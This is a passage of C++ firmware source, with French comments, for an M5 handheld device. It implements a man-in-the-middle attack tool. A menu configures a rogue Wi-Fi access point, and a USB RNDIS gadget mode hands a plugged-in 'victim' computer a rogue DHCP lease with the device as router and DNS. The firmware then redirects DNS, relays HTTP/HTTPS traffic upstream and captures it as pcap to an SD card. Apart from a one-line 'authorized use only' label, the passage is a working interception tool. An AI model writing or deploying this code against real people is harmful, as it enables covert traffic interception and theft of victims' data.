                else M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
                uint16_t rbg = (i == sel) ? menuSelectedBackgroundColor : menuBackgroundColor;
                M5.Display.setCursor(8, y); M5.Display.print(it[i]);
                if (i == 0 && up_ssid[0]) { M5.Display.setTextColor(0x5AEB, rbg); M5.Display.printf(":%.10s", up_ssid); }
                if (i == 2) { M5.Display.setTextColor(0x5AEB, rbg); M5.Display.printf(":%.9s", ap_ssid); }
                if (i == 3) { M5.Display.setTextColor(0x5AEB, rbg); M5.Display.print(strlen(ap_pass) >= 8 ? ":WPA2" : ":open"); }
            }
            M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK); M5.Display.setTextSize(1);
            M5.Display.setCursor(5, 122); M5.Display.print("lab/authorized use only");
            M5.Display.display(); rd = false;
        }
        M5.update(); cardUpdate();
        if (kp(KEY_BACKSPACE)) { keyRelease(); return; }
        if (kp(';')) { keyRelease(); sel = (sel + N - 1) % N; rd = true; delay(90); }
        if (kp('.')) { keyRelease(); sel = (sel + 1) % N; rd = true; delay(90); }
        if (kp(KEY_ENTER)) {
            keyRelease();
            if (sel == 0) mtext("Uplink SSID", up_ssid, sizeof up_ssid, false);
            else if (sel == 1) mtext("Uplink password", up_pass, sizeof up_pass, true);
            else if (sel == 2) mtext("Rogue AP SSID", ap_ssid, sizeof ap_ssid, false);
            else if (sel == 3) mtext("Rogue pass (>=8 or empty)", ap_pass, sizeof ap_pass, true);
            else if (sel == 4) run();
            else usbArmAndReboot();         // sel==5 : arme le gadget USB MITM + reboot (victime en USB)
            rd = true;
        }
        delay(10);
    }
}

// ============================================================================
//  USB MITM (gadget RNDIS) : meme moteur relais que ci-dessus, mais la victime
//  arrive par le gadget USB (192.168.7.1) au lieu du rogue AP WiFi. WiFi STA =
//  uplink internet. Gadget monte au early-boot (comme lockpicker). NAPT etant
//  gate dans le lwIP precompile, on relaie a l'applicatif (DNS redirect + :80/:443)
//  et on pcap sur SD. Increment 1 : a valider au boot sur device (coexistence
//  gadget USB + WiFi STA, comme le lockpicker a du etre de-risque).
// ----------------------------------------------------------------------------
extern "C" void usbnet_enable_interface(void);   // definis dans lockpicker_glue.c
extern "C" void usbnet_netif_up(void);

static bool usbArmRead() { Preferences p; if (!p.begin("usbmitm", true)) return false; bool a = p.getBool("armed", false); p.end(); return a; }
static void usbArmWrite(bool v) { Preferences p; if (!p.begin("usbmitm", false)) return; p.putBool("armed", v); if (v) { p.putString("ssid", up_ssid); p.putString("pass", up_pass); } p.end(); }
static void usbLoadCreds() {
  Preferences p; if (!p.begin("usbmitm", true)) return;
  String s = p.getString("ssid", ""), pw = p.getString("pass", ""); p.end();
  strncpy(up_ssid, s.c_str(), sizeof up_ssid - 1); up_ssid[sizeof up_ssid - 1] = 0;
  strncpy(up_pass, pw.c_str(), sizeof up_pass - 1); up_pass[sizeof up_pass - 1] = 0;
}

// Arme le gadget (depuis le menu MITM Proxy, item 5) : exige l'uplink, puis reboot.
static void usbArmAndReboot() {
  auto& d = M5.Display;
  if (!up_ssid[0]) { d.fillScreen(TFT_BLACK); d.setTextColor(TFT_RED, TFT_BLACK); d.setCursor(6, 40); d.print("Set uplink SSID first"); d.display(); delay(1500); return; }
  d.fillScreen(TFT_BLACK); d.setTextColor(TFT_YELLOW, TFT_BLACK); d.setCursor(6, 30); d.println("ARM USB MITM gadget ?");
  d.setTextColor(TFT_WHITE, TFT_BLACK); d.setCursor(6, 54); d.printf("uplink: %.16s", up_ssid);
  d.setCursor(6, 78); d.println("ENTER=arm+reboot  `=cancel"); d.display();
  for (;;) { M5.update(); cardUpdate();
    if (kp(KEY_ENTER)) { usbArmWrite(true); d.fillScreen(TFT_BLACK); d.setCursor(6, 40); d.print("Reboot gadget..."); d.display(); delay(600); ESP.restart(); }
    if (kp('`') || kp(KEY_BACKSPACE)) { keyRelease(); return; }
    delay(8);
  }
}

static volatile uint32_t g_usb_leases = 0;   // nb de baux DHCP accordes (ACK) a la victime
extern "C" struct netif* usbnet_get_netif(void);   // netif gadget (glue.c)

// Serveur DHCP en RAW lwIP : la reponse OFFER/ACK est envoyee en broadcast SUR LE NETIF GADGET
// (udp_sendto_if), pas sur le netif default -> qui repasse au WiFi une fois l'uplink connecte,
// ce qui faisait partir l'OFFER cote WiFi et la victime ne recevait jamais son bail. Le callback
// tourne dans le thread tcpip -> appels lwIP surs. yiaddr .2, gw/dns = .1 (pas de WPAD).
static void usbDhcpRecv(void* arg, struct udp_pcb* pcb, struct pbuf* pb, const ip_addr_t* a, u16_t pt) {
  (void)arg; (void)a; (void)pt;
  if (!pb) return;
  uint8_t* in = (uint8_t*)pb->payload; uint16_t len = pb->len;
  if (len >= 240 && in[0] == 1 && in[236]==0x63 && in[237]==0x82 && in[238]==0x53 && in[239]==0x63) {
    uint8_t type = 0; { int i = 240; while (i < len) { uint8_t c=in[i]; if(c==255)break; if(c==0){i++;continue;} if(c==53){type=in[i+2];break;} i+=2+in[i+1]; } }
    uint8_t reply = (type==1)?2:(type==3)?5:0;
    if (reply) {
      struct pbuf* rp = pbuf_alloc(PBUF_TRANSPORT, 300, PBUF_RAM);
      if (rp) {
        uint8_t* o2 = (uint8_t*)rp->payload; memset(o2, 0, 300);
        o2[0]=2;o2[1]=1;o2[2]=6; memcpy(o2+4,in+4,4);
        o2[16]=192;o2[17]=168;o2[18]=7;o2[19]=2;             // yiaddr
        o2[20]=192;o2[21]=168;o2[22]=7;o2[23]=1;             // siaddr
        memcpy(o2+28,in+28,16);
        o2[236]=0x63;o2[237]=0x82;o2[238]=0x53;o2[239]=0x63;
        int o=240;
        o2[o++]=53;o2[o++]=1;o2[o++]=reply;
        o2[o++]=54;o2[o++]=4;o2[o++]=192;o2[o++]=168;o2[o++]=7;o2[o++]=1;
        o2[o++]=51;o2[o++]=4;o2[o++]=0;o2[o++]=0;o2[o++]=0x0E;o2[o++]=0x10;
        o2[o++]=1; o2[o++]=4;o2[o++]=255;o2[o++]=255;o2[o++]=255;o2[o++]=0;
        o2[o++]=3; o2[o++]=4;o2[o++]=192;o2[o++]=168;o2[o++]=7;o2[o++]=1;    // router = self
        o2[o++]=6; o2[o++]=4;o2[o++]=192;o2[o++]=168;o2[o++]=7;o2[o++]=1;    // DNS = self
        o2[o++]=255;
        pbuf_realloc(rp, o);
        struct netif* gn = usbnet_get_netif();
        if (gn) udp_sendto_if(pcb, rp, IP_ADDR_BROADCAST, 68, gn);           // broadcast SUR le gadget
        pbuf_free(rp);
        if (reply == 5) g_usb_leases++;
      }
    }
  }
  pbuf_free(pb);
}
static struct udp_pcb* g_dhcp_pcb = nullptr;
static void usbDhcpStart_cb(void* arg) {   // tourne dans le thread tcpip (tcpip_callback)
  (void)arg;
  if (g_dhcp_pcb) return;
  g_dhcp_pcb = udp_new();
  if (g_dhcp_pcb) { udp_bind(g_dhcp_pcb, IP_ANY_TYPE, 67); udp_recv(g_dhcp_pcb, usbDhcpRecv, NULL); }
}

// Boucle gadget MITM (ne revient pas : reboot normal a la sortie).
static void runUsbGadget() {
  M5.begin(); M5.Lcd.setRotation(1);  // ecran+clavier : le bootHook tourne AVANT le M5.begin() du firmware
                                      // (M5Unified.begin n'appelle pas USB.begin -> l'ordre gadget reste bon)
  SPI.begin(SCK, MISO, MOSI, -1);     // le bootHook court AVANT le SD.begin() du setup() normal : sans ca,
  SD.begin(12, SPI, 40000000UL);      // toute ecriture SD (usbmitm.log + pcap) echoue silencieusement en mode gadget
  esp_netif_init();                 // idempotent ; sinon tache TCP-IP manquante -> crash gadget
  usbnet_enable_interface();        // RNDIS AVANT USB.begin
  usbnet_netif_up();
  USB.begin();
  usbLoadCreds();
  { auto& d0 = M5.Display; d0.fillScreen(TFT_BLACK);
    d0.setTextColor(TFT_GREEN, TFT_BLACK); d0.setTextSize(1); d0.setCursor(4, 4);  d0.print("USB MITM gadget UP");
    d0.setTextColor(TFT_WHITE, TFT_BLACK); d0.setCursor(4, 18); d0.print("192.168.7.1 (victim side)"); d0.display(); }
  WiFi.mode(WIFI_STA);
  if (up_ssid[0]) WiFi.begin(up_ssid, up_pass);
  { auto& d0 = M5.Display; uint32_t t0 = millis(); int dots = 0;
    while (WiFi.status() != WL_CONNECTED && millis() - t0 < 20000) {        // feedback pendant le connect
      d0.fillRect(0, 34, d0.width(), 12, TFT_BLACK);
      d0.setTextColor(TFT_CYAN, TFT_BLACK); d0.setCursor(4, 34);
      d0.printf("WiFi %.14s %.*s", up_ssid, (dots % 4) + 1, "....");
      d0.display(); dots++; delay(250);
    } }
  // usbnet_netif_up a mis le GADGET en netif default -> les connexions sortantes du relais
  // partiraient vers le gadget (pas d'internet). On remet le WiFi STA en default -> l'upstream
  // sort par le WiFi. Le DHCP (udp_sendto_if) et les reponses DNS/HTTP (unicast on-link) restent OK.
  if (WiFi.status() == WL_CONNECTED) {               // WiFi STA = netif default -> upstream relais via WiFi
    IPAddress wip = WiFi.localIP();
    struct netif* n;
    NETIF_FOREACH(n) {
      const ip4_addr_t* a = netif_ip4_addr(n);
      if (a && netif_is_up(n) && ip4_addr1(a)==wip[0] && ip4_addr2(a)==wip[1] && ip4_addr3(a)==wip[2] && ip4_addr4(a)==wip[3]) {
        netif_set_default(n); break;
      }
    }
  }
  apIP = IPAddress(192,168,7,1);    // DNS/relais repondent l'IP du gadget
  if (!g_mtx) g_mtx = xSemaphoreCreateMutex();
  log_alloc(); pcap_open();         // pcap sur SD (moteur deja teste cote WiFi)
  dnsUdp.begin(53); httpSrv.begin(); httpsSrv.begin();
  tcpip_callback(usbDhcpStart_cb, nullptr);   // DHCP raw lwIP : repond SUR le netif gadget (udp_sendto_if)
  SD.mkdir("/evil"); SD.mkdir("/evil/mitm");
  { File lf = SD.open("/evil/mitm/usbmitm.log", FILE_WRITE);   // log diag (lisible meme SD "dirty"/RO)
    struct netif* dn = netif_default;                          // quel netif porte la route par defaut ?
    if (lf) { lf.printf("wifi_status=%d ssid=%s ip=%s gw=%s sta_dns=%s def_netif=%c%c%d (gadget=.7.1 / STA=uplink)\n",
                        (int)WiFi.status(), up_ssid, WiFi.localIP().toString().c_str(), WiFi.gatewayIP().toString().c_str(),
                        WiFi.dnsIP().toString().c_str(),
                        dn ? dn->name[0] : '?', dn ? dn->name[1] : '?', dn ? (int)dn->num : -1); lf.close(); } }
  running = true;
  auto& d = M5.Display; d.fillScreen(TFT_BLACK);
  uint32_t lu = 0, ll = 0;
  while (true) {
    for (int i = 0; i < 24 && dns_poll(); i++) ;
    WiFiClient c; while (g_active < MITM_MAX && (c = httpSrv.available()))  spawn(c, 80);
    WiFiClient s; while (g_active < MITM_MAX && (s = httpsSrv.available())) spawn(s, 443);
    if (millis() - ll > 5000) { ll = millis();   // log diag periodique (SD)
      File lf = SD.open("/evil/mitm/usbmitm.log", FILE_APPEND);
      if (lf) { lf.printf("t=%lu wifi=%d leases=%lu dns=%lu relays=%lu act=%d\n", (unsigned long)(millis()/1000), (int)WiFi.status(), (unsigned long)g_usb_leases, (unsigned long)g_dns_q, (unsigned long)g_relays, g_active); lf.close(); }
    }
    if (millis() - lu > 600) { lu = millis();
      bool up = (WiFi.status() == WL_CONNECTED);
      d.fillScreen(TFT_BLACK); d.setTextSize(1);
      d.fillRect(0, 0, d.width(), 13, menuSelectedBackgroundColor);
      d.setTextColor(menuTextFocusedColor, menuSelectedBackgroundColor); d.setCursor(3, 3); d.print("USB MITM  gadget .7.1");
      int y = 17;
      d.setTextColor(up ? TFT_GREEN : TFT_RED, TFT_BLACK); d.setCursor(4, y);
      if (up) d.printf("WiFi %.10s %s", WiFi.SSID().c_str(), WiFi.localIP().toString().c_str());
      else    d.print("WiFi connecting...");
      y += 13;
      d.setTextColor(g_usb_leases ? TFT_GREEN : TFT_DARKGREY, TFT_BLACK); d.setCursor(4, y); d.printf("DHCP victim leases: %lu", (unsigned long)g_usb_leases); y += 13;
      d.setTextColor(TFT_WHITE, TFT_BLACK); d.setCursor(4, y); d.printf("DNS  queries: %lu", (unsigned long)g_dns_q); y += 13;
      d.setCursor(4, y); d.printf("Relay total:%lu act:%d", (unsigned long)g_relays, g_active); y += 13;
      d.setTextColor(TFT_CYAN, TFT_BLACK); d.setCursor(4, y); d.printf("pcap %.1f KB -> SD", g_pcap_bytes / 1024.0);
      d.fillRect(0, d.height() - 11, d.width(), 11, menuSelectedBackgroundColor);
      d.setTextColor(menuTextUnFocusedColor, menuSelectedBackgroundColor); d.setCursor(3, d.height() - 9); d.print("`=quit (reboot normal)");
      d.display();
    }
    M5.update(); cardUpdate();
    if (kp('`') || kp(KEY_BACKSPACE)) break;
    delay(2);
  }
  running = false; pcap_close();
  auto& dd = M5.Display; dd.fillScreen(TFT_BLACK); dd.setCursor(4, 40); dd.print("Reboot normal..."); dd.display(); delay(600);
  ESP.restart();
}

// A appeler TOUT EN HAUT de setup() (apres lockpickerBootHook). Si arme : prend la main.
inline void usbBootHook() {
  if (!usbArmRead()) return;
  usbArmWrite(false);   // anti-bootloop : desarmer avant tout code risque
  runUsbGadget();       // ne revient pas
}

} // namespace mitm
